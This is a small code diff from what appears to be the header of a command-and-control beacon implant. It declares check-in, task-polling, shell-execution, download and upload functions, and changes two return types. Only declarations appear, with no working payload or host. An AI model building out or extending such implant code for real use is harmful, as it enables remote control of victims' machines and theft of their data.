@@ -63,9 +63,9 @@ typedef struct {
 
 /* ── core functions ─────────────────────────────────────── */
 void         beacon_ctx_init(BEACON_CTX *ctx);
-void         beacon_checkin(BEACON_CTX *ctx);
+BOOL         beacon_checkin(BEACON_CTX *ctx);
 DWORD WINAPI beacon_loop(LPVOID lpParam);
-void         beacon_poll_tasks(BEACON_CTX *ctx);
+BOOL         beacon_poll_tasks(BEACON_CTX *ctx);
 void         beacon_exec_shell(BEACON_CTX *ctx, PARSED_TASK *task, TASK_RESULT *result);
 void         beacon_exec_download(PARSED_TASK *task, TASK_RESULT *result);
 void         beacon_exec_upload(PARSED_TASK *task, TASK_RESULT *result);
